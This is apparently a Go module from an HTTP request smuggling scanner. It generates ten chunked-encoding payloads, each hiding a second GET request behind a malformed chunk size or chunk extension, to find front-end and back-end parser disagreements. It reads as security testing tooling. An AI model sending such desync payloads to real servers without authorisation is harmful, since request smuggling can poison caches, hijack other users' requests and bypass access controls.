package vectors

import (
	"fmt"
	"strings"

	"github.com/byteoverride/desynctrace/internal/client"
)

// ChunkExtVector tests for chunk extension parsing disagreements.
// RFC 7230 allows chunk extensions: chunk-size [; chunk-ext] CRLF
// Different parsers handle chunk extensions differently — some ignore them,
// some include them in the chunk size, some fail on them.
type ChunkExtVector struct{}

func NewChunkExtVector() *ChunkExtVector {
	return &ChunkExtVector{}
}

func (v *ChunkExtVector) Name() string {
	return "Chunk-Ext (Chunked Extension Parsing Disagreement)"
}

func (v *ChunkExtVector) Type() VectorType {
	return ChunkExt
}

func (v *ChunkExtVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // requires raw client
}

func (v *ChunkExtVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Chunk extension with key=value on terminating chunk
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext1 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0;ext=val\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-ext-on-terminator",
			Data:        []byte(raw),
			Description: "Chunk extension on 0-chunk: '0;ext=val'. Some parsers may not recognize this as the terminator.",
			Technique:   "chunk-extension",
		})
	}

	// 2. Very long chunk extension (parser length limit disagreement)
	{
		longExt := strings.Repeat("A", 4096)
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext2 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0;ext=%s\r\n\r\n%s", longExt, smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-ext-long",
			Data:        []byte(raw),
			Description: "4KB chunk extension: one parser may truncate/reject, another may accept. Different buffer sizes cause disagreement.",
			Technique:   "chunk-extension-overflow",
		})
	}

	// 3. Chunk size with leading zeros
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext3 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		data := "hello"
		body := fmt.Sprintf("00000005\r\n%s\r\n0\r\n\r\n%s", data, smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-size-leading-zeros",
			Data:        []byte(raw),
			Description: "Chunk size with leading zeros '00000005'. Some parsers may misinterpret.",
			Technique:   "chunk-size-format",
		})
	}

	// 4. Chunk size with uppercase hex
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext4 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("A\r\n0123456789\r\n0\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-size-uppercase-hex",
			Data:        []byte(raw),
			Description: "Chunk size 'A' (uppercase hex) vs 'a' — case sensitivity in hex parsing.",
			Technique:   "chunk-size-case",
		})
	}

	// 5. Chunk size with +/- prefix (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext5 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("+5\r\nhello\r\n0\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-size-plus-prefix",
			Data:        []byte(raw),
			Description: "Chunk size with '+' prefix: '+5'. Some parsers accept, others reject.",
			Technique:   "chunk-size-sign",
		})
	}

	// 6. Chunk size with space before value (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext6 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf(" 5\r\nhello\r\n0\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-size-leading-space",
			Data:        []byte(raw),
			Description: "Chunk size with leading space: ' 5'. Whitespace handling differs across parsers.",
			Technique:   "chunk-size-whitespace",
		})
	}

	// 7. Chunk extension with CRLF injection (novel — very powerful)
	{
		// The chunk extension value contains CRLF, potentially injecting
		// a new chunk size line
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext7 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("5;ext=val\r\n0\r\n\r\nhello\r\n0\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-ext-crlf-injection",
			Data:        []byte(raw),
			Description: "CRLF in chunk extension: parser A may read extension, parser B sees it as a new chunk line. Causes disagreement on where chunk boundaries are.",
			Technique:   "chunk-ext-crlf",
		})
	}

	// 8. Invalid chunk size (0x prefix) (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext8 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0x5\r\nhello\r\n0\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-size-0x-prefix",
			Data:        []byte(raw),
			Description: "Chunk size with '0x' prefix: '0x5'. C-style hex prefix — some parsers accept it, others read it as 0 (terminator).",
			Technique:   "chunk-size-0x",
		})
	}

	// 9. Chunk extension with quoted string value
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext9 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0;ext=\"value with spaces\"\r\n\r\n%s", smuggled)
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-ext-quoted-value",
			Data:        []byte(raw),
			Description: "Chunk extension with quoted string value. RFC allows quoted-string in ext-val but implementations vary.",
			Technique:   "chunk-ext-quoted",
		})
	}

	// 10. Missing CRLF after last chunk (just LF) (novel)
	{
		smuggled := fmt.Sprintf("GET /desynctrace-chunkext10 HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("5\r\nhello\r\n0\n\n%s", smuggled) // \n instead of \r\n
		raw := buildChunkedReq(host, path, body)
		payloads = append(payloads, RawPayload{
			Name:        "chunk-bare-lf-terminator",
			Data:        []byte(raw),
			Description: "Bare LF instead of CRLF after terminating chunk. Some parsers accept \\n, others require \\r\\n.",
			Technique:   "chunk-bare-lf",
		})
	}

	return payloads
}

func (v *ChunkExtVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}

func buildChunkedReq(host, path, body string) string {
	return fmt.Sprintf("POST %s HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"Content-Length: %d\r\n"+
		"Connection: keep-alive\r\n"+
		"\r\n"+
		"%s", path, host, len(body), body)
}
